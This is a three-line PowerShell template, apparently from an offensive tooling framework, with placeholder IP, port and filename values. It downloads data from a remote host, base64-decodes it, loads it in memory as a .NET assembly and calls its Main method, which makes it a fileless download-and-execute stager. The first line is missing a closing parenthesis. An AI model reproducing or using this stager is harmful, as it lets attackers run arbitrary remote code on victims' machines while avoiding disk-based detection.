$y = (New-Object System.Net.WebClient).DownloadData('http://{{ip}}:{{port}}/{{filename}}'
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($y))
[HelloWorld]::Main($args)
